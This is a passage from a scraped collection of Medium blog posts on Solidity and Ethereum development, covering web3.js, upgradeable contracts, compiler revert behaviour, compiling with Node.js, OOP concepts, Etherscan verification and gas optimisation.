https://polymath.network", "responses": 2, "tags": ["Ethereum", "Solidity", "Development", "Blockchain", "Tech Blog"]}, {"title": "Interacting with Smart Contracts using Solidity & Web3", "post_link": "https://medium.com/zeonlab-blockchain-semantic-blog/interaction-with-solidity-using-web3-5a4f1a7166f3?source=search_post", "author_name": "Anurag Srivastava", "author_link": "https://medium.com/@anuragsrivastava.zeon", "publish_date": "2017-12-14", "last_modified_date": "2018-06-18", "readtime": "4.14", "claps": 480, "voters": 47, "content": "Solidity using web3.jsInteracting with Smart Contracts using Solidity & Web3Anurag SrivastavaFollowDec 14, 2017 \u00b7 5 min readEverything we do on the Ethereum Blockchain happens at the level of geth, which is a command line level interface on geth console. We do not expect an end user to be typing commands on some terminal for every small thing that he does on Ethereum. So there needs to be a way by which we can interact with the command line level interface using codes running on browsers. How do we make sure that a simple click by the user is interpreted as a command on the black-box terminal geth is running on? The answer to all these questions is web3.js.web3.js is a collection of libraries which allows us to interact with a local or remote ethereum node, using a HTTP or IPC connection. Simply speaking, it provides us with JavaScript APIs to communicate with geth. It uses JSON-RPC internally to communicate with geth, which is a light-weight remote procedure call (RPC) protocol.Ethereum Node Setup:Before we proceed any further, it\u2019s necessary to have a mining node of Ethereum running locally. In an earlier post, we have discussed on how to set up an Ethereum node. If you landed on this page without following along from the previous lessons, just copy and paste the following command in the terminal:geth \u2014 datadir <path to your testnet directory> \u2014 networkid 12345 \u2014 rpc \u2014 rpcaddr \u201clocalhost\u201d \u2014 rpcport 8545 \u2014 rpccorsdomain \u201c*\u201d \u2014 rpcapi \u201ceth,net,web3,personal,admin,mine\u201d \u2014 mine \u2014 minerthreads 1 \u2014 nodiscover \u2014 maxpeers 0 minerSample Smart Contract:In the following section, an example will be presented that will make use of web3.js to allow interaction with the contracts via a web page served over a simple HTTP web server. This can be achieved by following these steps:pragma solidity ^0.4.11;contract sample { string public name = \u201cZeonLab\u201d; function set(string _name) {    name = _name; }  function get() constant returns (string) {   return name; }}Creating UI for smart contract functionsOpen up your preferred code editor and create an index.html in the project folder.We\u2019re not going to create anything too fancy rather the UI would just have 2 buttons; One for the set() function and other for the get() function.To get started, paste the following contents into the empty index.html file:<html> <head>  <title>Web3 \u2014 Simple Demo</title> </head> <body class=\u201dcontainer\u201d>  <h3>Web3 \u2014 Usage Example</h3>   <div class=\u201dtab-content\u201d>   <div role=\u201dtabpanel\u201d class=\u201dtab-pane active\u201d id=\u201dblockchain\u201d>  <h3> 1. Set the value in the blockchain</h3>   <div class=\u201dform-group form-inline\u201d>    <input type=\u201dtext\u201d class=\u201dtext form-control\u201d value=\u201dSiri\u201d>      <button class=\u201dset btn btn-primary\u201d>Set Value</button>        <p>Once you set the value, an event will be created which will be used to identify the status of the transaction.</p>   </div>  <h3> 2. Get the current value</h3>   <div class=\u201dform-group\u201d>   <div>     current value is <span class=\u201dvalue\u201d></span>   </div>    <button class=\u201dget btn btn-primary\u201d>Get Value</button>      <p>Click the button to get the current value. The initial value of the variable name is \u201cZeonLab\u201d.</p>   </div>  <h3> 3. Contract Calls </h3>      <p>Javascript calls being made: </p>   </div>   </div></body>  <script></script></html>Using Web3.js to Interact with the Smart ContractHaving the HTML code ready, we need to import web3 module to interact with smart contract from HTML.If you do not have web3.js already, download it from the following link:https://github.com/ethereum/web3.jsOnce downloaded, web3 module can be imported into Javascript using the script tag as:<script src=\u201dweb3.js-develop/dist/web3.js\u201d></script>Once the file is successfully referred in JS, web3 needs to be initialized by an HTTP endpoint. This HTTP endpoint is exposed by the Geth client on which a node was setup.Web3 provider can be set by adding the following lines of code between the script tags:var Web3 = require(\u2018web3\u2019);var web3 = new Web3();web3.setProvider(new web3.providers.HttpProvider(\u201chttp://localhost:8545\"));Next, we need to use the web3.eth.contract() method to initialize (or create) the contract on an address. It accepts one parameter, which is referred to as the ABI (Application Binary Interface).This ABI allows you to call functions and receive data from your smart contract.To retrieve the ABI of the contract, copy the contract code and paste it in Remix IDE(http://remix.ethereum.org). Next click on the \u2018Details\u2019 button in \u2018Compile\u2019 tab. Scroll down to see the contract ABI. Copy the ABI by clicking on the icon shown below:Once done paste the ABI code into script against the variable sampleContractABI. Your code should look something like this:var sampleContractABI = [{\u201cconstant\u201d:true,\u201dinputs\u201d:[],\u201dname\u201d:\u201dname\u201d,\u201doutputs\u201d:[{\u201cname\u201d:\u201d\u201d,\u201dtype\u201d:\u201dstring\u201d}],\u201dpayable\u201d:false,\u201dstateMutability\u201d:\u201dview\u201d,\u201dtype\u201d:\u201dfunction\u201d},{\u201cconstant\u201d:false,\u201dinputs\u201d:[{\u201cname\u201d:\u201d_name\u201d,\u201dtype\u201d:\u201dstring\u201d}],\u201dname\u201d:\u201dset\u201d,\u201doutputs\u201d:[],\u201dpayable\u201d:false,\u201dstateMutability\u201d:\u201dnonpayable\u201d,\u201dtype\u201d:\u201dfunction\u201d},{\u201cconstant\u201d:true,\u201dinputs\u201d:[],\u201dname\u201d:\u201dget\u201d,\u201doutputs\u201d:[{\u201cname\u201d:\u201d\u201d,\u201dtype\u201d:\u201dstring\u201d}],\u201dpayable\u201d:false,\u201dstateMutability\u201d:\u201dview\u201d,\u201dtype\u201d:\u201dfunction\u201d},{\u201canonymous\u201d:false,\u201dinputs\u201d:[{\u201cindexed\u201d:false,\u201dname\u201d:\u201dname\u201d,\u201dtype\u201d:\u201dstring\u201d}],\u201dname\u201d:\u201dLogSet\u201d,\u201dtype\u201d:\u201devent\u201d}];Next initialize the smart contract with web3.eth.contract method as follows:var sampleContract = web3.eth.contract(sampleContractABI);Now that we have the interface for interacting with our contract through the sampleContract variable, the last thing to do is to define the actual contract address.Go back to Remix and click the Run tab, and click on the copy icon next to the contract that we created earlier on the right column. Then add the following lines of code to the script.var sampleContractInstance = sampleContract.at(<contract address>);Great! Now let\u2019s attach simple JQuery functions to the get and set buttons in the HTML.$(\u201c#blockchain button.set\u201d).click(function() {var value = $(\u201c#blockchain input.text\u201d).val();var params = {gas: 40000,from:};SimpleStorage.sendTransaction.set(value, params);});$(\u201c#blockchain button.get\u201d).click(function() {var value = SimpleStorage.get.call();$(\u201c#blockchain .value\u201d).html(value);});In the set(), we\u2019re simply sending a transaction to the \u2018SampleContract\u2019 with the params specified. Whereas in the get(), we\u2019re simply making a call and the result is set to an element with the class name \u2018value\u2019.If you did everything correctly, you can now view index.html in the browser, with get and set buttons.This is all about using TestRPC with Web3.js to interact with smart contracts through a browser. If you are still facing troubles write to us at hello@blockchainsemantics.com .", "responses": 2, "tags": ["Ethereum", "Deeptech"]}, {"title": "Interfaces make your Solidity contracts upgradeable", "post_link": "https://medium.com/@nrchandan/interfaces-make-your-solidity-contracts-upgradeable-74cd1646a717?source=search_post", "author_name": "Chandan Kumar", "author_link": "https://medium.com/@nrchandan", "publish_date": "2017-06-29", "last_modified_date": "2018-06-01", "readtime": "1.85", "claps": 441, "voters": 46, "content": "Interfaces make your Solidity contracts upgradeableChandan KumarFollowJun 29, 2017 \u00b7 2 min readThis blog post talks about two problems common to all Ethereum smart contracts \u2014 upgradeability and block gas limit. The idea presented here builds upon this excellent blog post by Elena Dimitrova of Colony. Please read it before proceeding further.The EternalStorage idea presented by Elena works very well because you can have newer versions of your contract talk to the same EternalStorage. However, upgrading the organisation requires upgrading the parent contract as well. This is due to the fact that the Parent contract (reproduced below) is coded to a specific implementation of the Organisation contract.Original implementation of Parent.solShortcomings of the original solutionThe \u201cupgradeOrganisation\u201d function doesn\u2019t work since any new instance of organisation will have the exact same blueprint as the original organisation. The bytecode of the Organisation contract was deployed along with the Parent contract, so the Parent contract knows of only that specific implementation of the Organisation contract. This implies that in order to upgrade the contract, you need to upgrade the Parent contract as well. In the above implementation, the Parent contract is not upgradeable but it can be easily made so by storing the organisation mapping in the EternalStorage as well. Redeploying the Parent contract would obviously change the contract address with which your users interact. Hence, this upgrade is not transparent to the users.This approach also does not address the block gas limit issue during deployment since all components need to be deployed in the same transaction.Revised SolutionAn alternative solution is to create an Organisation interface and code the Parent to the interface instead.The Parent contract can then be deployed independent of the Organisation contract. Hence, these two contracts can be deployed in separate transactions, each with a lower gas requirement than the gas required for deploying the entire set of contracts. This alleviates the block gas limit issue.Newer implementations of the Organisation contract can be instantiated and passed on to the modified \u201cupgradeOrganisation\u201d function to retain the original data. The Parent contract does not need to be redeployed in order to upgrade an organisation. This upgrade procedure is transparent to the users of the contract.CaveatsA side-effect of this separation is that the Parent contract can no longer instantiate the Organisation contract. The owners or the admins of the contracts are responsible for instantiating the organisation and using Parent to register or upgrade it. This seems to be a fair tradeoff for the benefits it provides \u2014 transparent upgradeability and lower gas requirement per block.SummaryWhile there are a few other approaches to make your contracts upgradeable, this one is simple to understand and easy to implement, and addresses both upgradeability and block gas limit issues. We have used this solution in an internal app at my organisation.The updated code is embedded below. To see how these contracts are used with Truffle, see this GitHub repo.(Article cross-posted on Imaginea blog)", "responses": 1, "tags": ["Ethereum", "Blockchain", "Solidity"]}, {"title": "Explaining unexpected reverts starting with Solidity 0.4.22", "post_link": "https://medium.com/@chris_77367/explaining-unexpected-reverts-starting-with-solidity-0-4-22-3ada6e82308c?source=search_post", "author_name": "Christian Reitwiessner", "author_link": "https://medium.com/@chris_77367", "publish_date": "2018-05-30", "last_modified_date": "2018-06-13", "readtime": "2.86", "claps": 442, "voters": 46, "content": "Explaining unexpected reverts starting with Solidity 0.4.22Christian ReitwiessnerFollowMay 30, 2018 \u00b7 3 min readStarting with Solidity version 0.4.22, people are experiencing unexpected reverts especially in connection with calling functions on some ERC20 tokens. This article would like to explain why this is happening and tries to suggest that this might be better than how it behaved before.When did it happen?With 0.4.22, we enabled the use of the Byzantium opcodes. More generally, Solidity now has a setting to select which EVM version is targeted. The two opcodes returndatasize and returndatacopy finally enabled accessing dynamic arrays being returned from function calls. The ABI encoding of dynamic arrays contains pointers and in order to protect against wild pointers being returned from potentially malicious contracts, we enabled a check that these pointers are not out of bounds. Together with this check, we thought it would be a good idea to do that in general: Whenever we decode returned data, we check that we do actually read from the returned data and not from some other part of the memory which could contain garbage.This check is only possible on post-Byzantium EVMs, because it needs the returndatasize opcode.I hope you now think that this is a good thing to do, but what does this have to do with your code?Where does it happen?Code that experiences this behaviour does not correctly adhere to the required interface specifications. As an example, let us take a look at the ERC20 token interface. All ERC20 tokens have to contain the following function:function transfer(address to, uint amount) public    returns (bool success) { ... }The important part here is the bool success. The function is supposed to return true only if the transfer actually happened (i.e. if the sender had enough funds). Some tokens chose to implement this function by either returning true or reverting the call altogether. This is fine and might even be better in some situations. Because of that, the return value was deemed unnecessary and contracts were written that had the following function:function transfer(address to, uint amount) public { ... }These contracts are not ERC20 contracts.If you implement a contract C that inherits from a contract or an interface that is identical to the ERC20 specification, but contains the transfer function without return parameters, the compiler will complain that you did not properly override the function.Why did it work before?Calling the transfer function on a contract that is not ERC20 compliant because it returns the wrong type worked before Solidity 0.4.22. The reason is that before byzantium, smart contracts have no feasible way to check the length of the returned data. Because of that, the caller just has to assume that the callee provided enough data to be decoded in the given types. The caller decoded 32 bytes somewhere in memory and assumed it was the representation of a bool variable. Usually, callers of transfer check that it returns true. This check worked, even though the called contract did not return anything, because there was garbage written in memory at that point and most of the time, this garbage is not 0, but some of the other 2\u00b2\u2075\u2076-1 values (0 is the only representation of false).What can we do?Always be careful if you make assumptions about the type of a contract you do not know. Explicit type conversions between contracts are allowed in Solidity, but the compiler has to trust the user that this is the right thing to do. Most of the time, you pass in an address from the user interface anyway, where the compiler is not even involved in the checking.In my opinion, checking the size of the returned data is the correct thing to do. It might have been better to wait for version 0.5.0, but there is an easy workaround if you still want to use the old behaviour:The compiler has a switch solc --evm-version homestead to use the old version of the EVM which does not have returndatasize . This way, the check about the size of the returned data is not performed. You will decode garbage which can lead to security problems, but at least it will still work.If you have a contract that uses the wrong ERC20 interface, it is probably best to implement a proxy contract that is an actual ERC20-compliant contract and which just forwards all calls to the original contract.Discussion: https://github.com/ethereum/solidity/issues/4116AcknowledgementsThis behaviour was noticed, among others, by Dean Eigenmann, Matthew Di Ferrante, Ivo Georgiev and Yaron Velner.", "responses": 3, "tags": ["Ethereum", "Solidity"]}, {"title": "How To: Compile a Solidity Smart Contract Using Node.js", "post_link": "https://medium.com/coinmonks/how-to-compile-a-solidity-smart-contract-using-node-js-51ea7c6bf440?source=search_post", "author_name": "Morgan Fogarty", "author_link": "https://medium.com/@morganfogarty", "publish_date": "2018-05-11", "last_modified_date": "2018-06-05", "readtime": "2.78", "claps": 291, "voters": 45, "content": "How To: Compile a Solidity Smart Contract Using Node.jsMorgan FogartyFollowMay 11, 2018 \u00b7 3 min readIn the previous blog post, we wrote a smart contract using the Solidity programming language.Next, we need to compile the hello.sol file so that we can test and deploy our smart contract.The properties we\u2019ll need to use on the compiled file are the Application Binary Interface (ABI) or interface and the bytecode. The bytecode is what will actually go onto the blockchain to make the smart contract work and the interface will be the Javascript layer that acts like a human friendly map of the bytecode.Let\u2019s get started!In the terminal at the root of your project, type:npm install --save solcsolc is a Solidity compiler.Next, create a file called compile.js at the root of your project. It should be siblings with your contracts folder. Write the compile.js file, pictured below.compile.jsWe require two Node modules(path and fs) and our Solidity compiler (solc). The reason we can\u2019t simply require our hello.sol file is because Node will try to execute files as Javascript and would throw an error with a .sol file.The helloPath variable finds the current working directory (__dirname) and navigates to the hello.sol file within it. The source variable is populated by the raw source code of hello.sol which is located in the helloPath. The UTF-8 string represents the encoding of the file.On line 8, we call compile() on the source code and specify how many contracts we\u2019ll be compiling. In our case, it\u2019s one.It may help us to see what\u2019s happening under the hood, so let\u2019s change line 8 a bit and log our contracts object to our console.altered line 8Type node compile.js into your command line at the root of your project and you should get something like this:weeeeeeeeeeee!!!!!!!The result of compile() will always be an object. contracts is the top level object, containing all the contracts we\u2019ve compiled. Again, in our case it\u2019s only one contract. Let\u2019s look closer at the two properties that we really care about: interface and bytecode.First, the bytecode.bytecodeThis is the code that will be deployed onto the blockchain and executed in the Ethereum Virtual Machine (EVM). As you can see, it\u2019s not human readable. Which brings us to our second important property, the interface. This is the ABI.Application Binary Interface (ABI)Looks a little more familiar, right? These are the Javascript methods that we\u2019ll be able to use when testing and deploying our contract.Once you\u2019ve thoroughly investigated the contracts object, go ahead and press undo a few times to bring line 8 back to it\u2019s ready state.Ready!Compile file written!Tune in next time when we will test the contract code using the Mocha testing framework.Copy / paste-able compile.js file:const path = require('path');const fs = require('fs');const solc = require('solc');const helloPath = path.resolve(__dirname, 'contracts', 'hello.sol');const source = fs.readFileSync(helloPath, 'UTF-8');module.exports = solc.compile(source, 1).contracts[':Hello'];", "responses": 4, "tags": ["Ethereum", "Nodejs", "Women In Tech", "Tutorial", "Smart Contracts"]}, {"title": "Solidity and object oriented programming (OOP)", "post_link": "https://medium.com/coinmonks/solidity-and-object-oriented-programming-oop-191f8deb8316?source=search_post", "author_name": "Tech Geek", "author_link": "https://medium.com/@techgeek628", "publish_date": "2018-06-12", "last_modified_date": "2018-06-19", "readtime": "5.36", "claps": 181, "voters": 34, "content": "Solidity and object oriented programming (OOP)Tech GeekFollowJun 12, 2018 \u00b7 6 min readContract Composition :Solidity supports contract composition. Composition refers to combining multiple contracts or data types together to create complex data structures and contracts.It is a good practice to break down problems into multi-contract solutions and compose them together using contract composition.Inheritance :Inheritance is one of the pillars of object orientation and Solidity supports inheritance between smart contracts. Inheritance is the process of defining multiple contracts that are related to each other through parent-child relationships.The contract that is inherited is called the parent contract and the contract that inherits is called the child contract.Similarly, the contract has a parent known as the derived class and the parent contract is known as a base contract. Inheritance is mostly about code-reusability. There is a is-a relationship between base and derived contracts and all public and internal scopedfunctions and state variables are available to derived contracts.In fact, Solidity compiler copies the base contract bytecode into derived contract bytecode. The is keyword is used to inherit the base contract in the derived contract. It is one of the most important concepts that should be mastered by every Solidity developer because of the way contracts are versioned and deployed.Solidity supports multiple types of inheritance, including multiple inheritance. Solidity copies the base contracts into the derived contract and a single contract is created with inheritance. A single address is generated that is shared between contracts in a parent- child relationship.Single inheritance :Single inheritance helps in inheriting the variables, functions, modifiers, and events of base contracts into the derived class.Single inheritanceMulti-level inheritance:Multi-level inheritance is very similar to single inheritance; however, instead of just a singleparent-child relationship, there are multiple levels of parent-child relationship.Multi-level inheritanceThis is shown in the following diagram. Contract A is the parent of Contract B and Contract B is the parent of Contract C:Hierarchical inheritance :Hierarchical inheritance is again similar to simple inheritance. Here, however, a single contract acts as a base contract for multiple derived contracts.Hierarchical inheritanceThis is shown in the following diagram. Here, Contract A is derived in both Contract B and Contract C:Multiple inheritance :Solidity supports multiple inheritance. There can be multiple levels of single inheritance.However, there can also be multiple contracts that derive from the same base contract.These derived contracts can be used as base contracts together in further child classes.When contracts inherit from such child contracts together, there is multiple inheritance, as shown in the following diagram:Multiple inheritance :Note : Solidity follows the path of Python and uses C3 Linearization, also known as Method Resolution Order (MRO), to force a specific order in graphs of base contracts. The contracts should follow a specific order while inheriting, starting from the base contract through to the most derived contract.Encapsulation :Encapsulation is one of the most important pillars of OOP. Encapsulation refers to the process of hiding or allowing access to state variables directly for changing their state. It refers to the pattern of declaring variables that cannot be accessed directly by clients and can only be modified using functions. This helps in constraint access to variables but, at the same time, allows enough access to class for taking action on it.Solidity provides multiple visibility modifiers such as external , public , internal , and private that affects the visibility of state variables within the contract in which they are defined, inheriting child contracts or outside contracts.Polymorphism :Polymorphism means having multiple forms. There are the following two types of polymorphism:1. Function polymorphism2. Contract polymorphismFunction polymorphism :Function polymorphism refers to declaring multiple functions within the same contract or inheriting contracts having the same name. The functions differ in the parameter data types or in the number of parameters. Return types are not taken into consideration for determining valid function signatures for polymorphism. This is also known as method overloading.pragma solidity ^0.4.19;contract helloFunctionPloymorphism {  function getVariableData(int8 data) public pure returns(int8 output) { return data; }function getVariableData(int16 data) public pure returns(int16 output) { return data; }}Contract polymorphism:Contract polymorphism refers to using multiple contract instances interchangeably when the contracts are related to each other by way of inheritance. Contract polymorphism helps in invoking derived contract functions using a base contract instance.pragma solidity ^0.4.19;contract ParentContract { uint internal simpleInteger;function SetInteger(uint _value) public { simpleInteger = _value; }function GetInteger() public view returns (uint) { return 10; }}contract ChildContract is ParentContract {  function GetInteger() public view returns (uint) { return simpleInteger; }}Abstract contracts :Abstracts contracts are contracts that have partial function definitions. You cannot create an instance of an abstract contract. An abstract contract must be inherited by a child contract for utilizing its functions. Abstract contracts help in defining the structure of a contract and any class inheriting from it must ensure to provide an implementation for them. If the child contract does not provide the implementation for incomplete functions, even its instance cannot be created. The function signatures terminate using the semicolon, ; , character.There is no Solidity-provided keyword to mark a contract as abstract. A contract becomes an abstract class if it has functions without implementation.pragma solidity ^0.4.19;contract abstractHelloWorld { function GetValue() public view returns (uint); function SetValue(uint _value) public;function AddNumber(uint _value) public returns (uint) { return 10; }}contract HelloWorld is abstractHelloWorld{ uint private simpleInteger;function GetValue() public view returns (uint) { return simpleInteger; }  function SetValue(uint _value) public { simpleInteger = _value; }function AddNumber(uint _value) public returns (uint ){ return simpleInteger = _value; }}Interfaces :Interfaces are like abstract contracts, but there are differences. Interfaces cannot contain any definition. They can only contain function declarations. It means functions in interfaces cannot contain any code. They are also known as pure abstract contracts. An interface can contain only the signature of functions.pragma solidity ^0.4.19;contract abstractHelloWorld { function GetValue() public view returns (uint); function SetValue(uint _value) public;function AddNumber(uint _value) public returns (uint) { return 10; }}contract HelloWorld is abstractHelloWorld{ uint private simpleInteger;function GetValue() public view returns (uint) { return simpleInteger; }  function SetValue(uint _value) public { simpleInteger = _value; }function AddNumber(uint _value) public returns (uint ){ return simpleInteger = _value; }}Summary :In this article I focused primarily on smart contracts, the different ways to create an instance, and all the important object-oriented concepts related to them, including inheritance, polymorphism, abstraction, and encapsulation.Multiple types of inheritance can be implemented in Solidity. Simple,multiple, hierarchical, and multi-level inheritance were discussed, along with usage and implementation of abstract contracts and interfaces. It should be noted that using inheritance in Solidity, there is eventually just one contract that is deployed instead of multiple contracts. There is just one address that can be used by any contract with a parent- child hierarchy.", "responses": 1, "tags": ["Solidity", "Ethereum", "Programming", "Blockchain Technology", "Object Oriented"]}, {"title": "Verifying your truffle-solidity contracts on Etherscan", "post_link": "https://blog.fundrequest.io/verifying-your-truffle-solidity-contracts-on-etherscan-87cb374e2adc?source=search_post", "author_name": "Quinten De Swaef", "author_link": "https://blog.fundrequest.io/@QuintenDes", "publish_date": "2017-10-12", "last_modified_date": "2018-06-07", "readtime": "3.32", "claps": 485, "voters": 40, "content": "Verifying your truffle-solidity contracts on EtherscanQuinten De SwaefFollowOct 12, 2017 \u00b7 4 min readThis is a quick, 5-minute tutorial on how to verify your solidity contracts, written using truffle, on etherscan.io.Navigate to your contractFirst of all, navigate to your contract on the chain. It can be found at https://etherscan.io/address/YOUR_HASH#codeNavigate to Verify and Publish to go to the correct verification page.We\u2019ll need to add some extra parameters, which can only be enabled by pointing your the url to a different endpoint. Change \u201ccontractVerify\u201d to \u201ccontractVerify2\u201d in your url.Fill in the correct valuesNext up, you\u2019ll need to fill in the correct values in the form. Enter the contract name you wish to verify. Choose the correct compiler. You can find the correct compiler by opening a new terminal and entering the following command.solc \u2014 versionThe result will most likely be a non-nightly build.The correct value for Runs, which is the amount of times the optimization should run, is either 0 or 200, depending on your truffle version. With newer versions, we recommend trying with 200 first.Paste the contents of your contracts in the code box. Keep the code as it was when you deployed it, but remove all the imports, as all code will be in a single file, so importing will not be necessary or supported.Tip: We recommend using this tool to flatten your code. What oracles-combine-solidity does it get your contract code, import every contract your contract uses and flatten it all into one file. It will make your life a lot easier.If you deployed a contract which contained constructor arguments, you\u2019ll need to add them in the following input box. Constructor arguments are expected to be ABI-encoded. More information on ABI-encoding can be found on the page, but remember arguments are _right to left_. An example for one of our projects can be found below.Tip: If you can\u2019t figure out your ABI-encoded constructor arguments, first look at the encoded unlinked binary of your contract, then look at the encoded transaction-arguments of the transaction that created your contract. If your contract was deployed with constructor arguments, they should have been appended to the transaction data. So the difference between the two will be the ABI-encoded constructor arguments.Lastly, you\u2019ll need to add any libraries you\u2019re using. You can find the location of your Libraries in the output of Truffle when you deployed them or in the generated json files.That\u2019s it, hit verify and publish. Your contract should now be verified. Your code should be visible on your contract and methods for reading the state of your contract will be available on the web page.Why verify your contracts?The reason we always verify our contracts is easy. First of all, it generates trust. People can see your contracts and verify the code with what you claim they should be doing.Secondly, it\u2019s darn useful to have an easy go-to page to read the state of your contracts.Get to Know FundRequestWebsite | Sign up | White paper | Progress reportsNever Miss An Update By Following FundRequest\u2019s ChannelsBlog | Telegram | Github | Reddit | TwitterOur partners", "responses": 5, "tags": ["Ethereum", "Solidity", "Development", "Etherscan", "Articles"]}, {"title": "Optimizing your Solidity contract\u2019s gas usage", "post_link": "https://medium.com/coinmonks/optimizing-your-solidity-contracts-gas-usage-9d65334db6c7?source=search_post", "author_name": "CipherZ", "author_link": "https://medium.com/@cipherz", "publish_date": "2018-04-05", "last_modified_date": "2018-06-18", "readtime": "5.84", "claps": 460, "voters": 42, "content": "Optimizing your Solidity contract\u2019s gas usageCipherZFollowApr 5, 2018 \u00b7 6 min readAs everyone in the Ethereum community knows, Gas is a necessary evil for the execution of smart contracts. If you specify too little, your transaction may not get picked up for processing in a timely manner \u2014 or, die in the middle of processing a smart contract action. That being said, a smart contract should not be greedy or loose with the valuable resources that the users entrust to them. It is for this reason that we will look into tuning and optimizing our contract to minimize the amount of gas required.Working with Gas as a UserWhen specifying a gas amount in Ethereum there are two components to take into consideration. The first is Gas Limit or the total gallons of gas to put in the tank of your smart contract. Note that this amount really only affects the smart contract execution itself and must be sufficient for all of the resources required by the smart contract. Otherwise, you will get an Out of Gas exception. Tools like MetaMask will attempt to make their best guess at this value and is more or less right on a non-congested ethereum network. A key point it is that any unused gas will be returned to you.ie. You set a gas limit of 300,000 and the transaction only takes 200,000 \u2014 you won\u2019t be charged for 300,000. The gas limit is how much you are willing to spend, but not how much you have to spend.The second parameter related to gas consumption for sending a transaction is the Gas Price. This amount is typically denoted in gwei(10\u2079 wei) and does not affect the execution of transaction or smart contract interaction, but rather the speed at which the transaction gets added to a block. To use the fuel in a car analogy, this price is the price of the fuel that you pay. If you pay a higher gas price, your transaction will get added to a block more quickly, thus speeding up the processing of your transaction. In today\u2019s terms, 20 gwei is an average price to pay and means your transaction will get processed fairly quickly. A price of 50 gwei will get you almost immediate processing, while a price of 5 gwei will take several minutes. The gas price is a powerful feature to have at your disposal depending on the type of dApp you are trying to write. Places like https://ethgasstation.info can help you to understand the current network load and corresponding wait times related to gas price.MetaMask Transaction(See Gas Limit and Gas Price)Working with Gas as a DeveloperAs a developer, you are not worried about Gas Price at all, but you want your smart contract Gas Limits to fall within a reasonable cost basis for your particular dApp. For instance, if you are creating a smart contract to handle custody of a million dollars worth of eth, you may not be concerned with a $5 gas limit. However, if you were doing a social platform with $5 gas limits for every post you would bankrupt your users very quickly. You need to design your smart contracts to fit with your use case as processing power and storage come at a high premium in ethereum right now.There are two main costs associated with sending and executing an Ethereum transaction on the blockchain.Execution costTransaction costNote: Since execution cost in included in the transaction cost, we are talking about the transaction cost in most cases when referring to a transaction\u2019s gas limit.Execution cost is primarily associated with the storage of global variables and the processing power used for calculations and local variable manipulation. So, a simple summary would be, All costs related to the internal storage and manipulation of the contract.Transaction cost includes the Execution cost as stated before AND the cost of sending data to the blockchain. Some of these variables include:Base transaction cost(common) ~21,000Contract deployment(first time) ~32,000Transaction input costs(common) ~4 for 0-byte and 64 for non-0 byte inputsContract-initiated transactions cost ~32,000 eachAll of these factors can cause your gas costs to add up quickly. Here are some main considerations when developing or tuning a contract:Contract SizeThe overall size of your contract will play a part in tx cost for all interactions with it. If you are able to break the contract up into smaller separate contracts, this will decrease user\u2019s gas costs when interacting. For instance, if you have a dApp that supports car and motorcycle rentals \u2014 good design would suggest that you make a single contract and share common parts. However, if the motorcycle market is down and no-one is renting motorcycles, it does not make sense for the car rental users to have to pay for the contract bloat of unused code. It may make sense to break the contract up into an Auto and Moto contract respectively.Global Variables(Storage)Global variables are stored or persisted in a contract\u2019s state on the blockchain. This is perhaps the most expensive operation in terms of gas for a transaction. It is therefore imperative to have the minimum memory footprint for your stored global variables. This is a good programming practice in all languages, but it is especially crucial in a constrained environment such as the ethereum blockchain. An instance of this would be using the expensive type string when you could use a uint to denote something.string STATUS = \u2018unknown status\u2019; //This is really expensiveuint STATUS = 0; //This is a lot cheaperNote: It is important to realize that a uint == uint256. Also, for whatever reason, a uint256 takes less gas to store than a uint8. So, if you are trying to optimize data types as you should, just realize this caveat.Remove as much duplication within structs as you can. If you have member variables within structs that are storing the same value, remove the duplicates if you can without sacrificing security.struct Game { uint256 betAmount; uint outcome; uint status; JediBet originator; JediBet taker; }  JediBet orig; // There is no reason to have these global vars JediBet take; // when they are already in the Game structTuning a contractWe will now take a look at our Bet.sol contract in Remix. Open up Remix in your browser, create a new contract, and paste in the code from here. Put your cursor on line 142\u2014 at the generateBetOutcome method and take a look in the upper right hand corner of the editor. You will see a gas pump icon and an estimate for the gas as shown here.How to check estimated execution gas cost for a methodThis tool is invaluable for a quick look at your estimated gas for a method invocation, but it is just an estimate. For private methods such as this, you don\u2019t have the luxury of calling it and seeing the gas usage from the debug logs.If you want to see a closer estimate of how much the execution will cost, you can make it public and call it directly from remix. Note that this is nowhere near the Remix IDE\u2019s estimated cost, but it could differ based on the state of the contract at the time of execution.Here are some costs per operation within Solidity to reference while tuning your contract(s).Operation         Gas           DescriptionADD/SUB           3             Arithmetic operationMUL/DIV           5             Arithmetic operationADDMOD/MULMOD     8             Arithmetic operationAND/OR/XOR        3             Bitwise logic operationLT/GT/SLT/SGT/EQ  3             Comparison operationPOP               2             Stack operation PUSH/DUP/SWAP     3             Stack operationMLOAD/MSTORE      3             Memory operationJUMP              8             Unconditional jumpJUMPI             10            Conditional jumpSLOAD             200           Storage operationSSTORE            5,000/20,000  Storage operationBALANCE           400           Get balance of an accountCREATE            32,000        Create a new account using CREATECALL              25,000        Create a new account using CALLSummaryTuning a contract is not an exact science, but is a balance of security, good coding practices, and cost. Optimizing code for performance and security is a new concept for most developers and the devastating effects of not doing so are only now being understood. Hopefully, this article has helped you as much as it has me in understanding and optimizing gas execution and transaction cost.", "responses": 7, "tags": ["Ethereum", "Gas", "Solidity", "Smart Contracts", "Remix"]}, {"title": "Writing Solidity Unit Tests for Testing Assert(), Require() and Revert() Conditions Using Truffle", "post_link": "https://medium.com/@kscarbrough1/writing-solidity-unit-tests-for-testing-assert-require-and-revert-conditions-using-truffle-2e182d91a40f?source=search_post", "author_name": "Karen Scarbrough", "author_link": "https://medium.com/@kscarbrough1", "publish_date": "2018-01-15", "last_modified_date": "2018-06-10", "readtime": "6.51", "claps": 232, "voters": 42, "content": "Writing Solidity Unit Tests for Testing Assert(), Require() and Revert() Conditions Using TruffleKaren ScarbroughFollowJan 15, 2018 \u00b7 7 min readWriting a share of unit tests using Javascript in Truffle, it started to nag at me that I had not been testing whether or not my contracts were \u201cthrowing\u201d at conditions in which I did not want functions to execute. As Ron Jeffries pointed out, \u201cI am pretty sure there is a difference between \u201cthis has not been proven\u201d and \u201cthis is false.\u201d So, I set on a mission to learn how test \u201cthrows\u201d, or now asserts, requires, and reverts, using Solidity unit tests. There is a well laid out Truffle tutorial for testing throws, and I have to admit the first time I approached it, it was over my head, and I put it to the side. Revisiting the material again, well, practice pays off, and it\u2019s one more very powerful tool to add the arsenal. I haven\u2019t seen a ton out on this subject yet, so I figured it couldn\u2019t hurt to write supplemental piece on how I learned my way through these Solidity tests. If you feel thrown off, put it down, learn some more advanced methods in Solidity contract design and come back \u2014 because what contract couldn\u2019t use a little more testing?Review of Assert(), Require(), and Revert()First, let\u2019s go over how assert(), require(), and revert() work as throw has been deprecated after Solidity Compiler Version 0.4.13 \u2014 at the time of writing we are currently on version 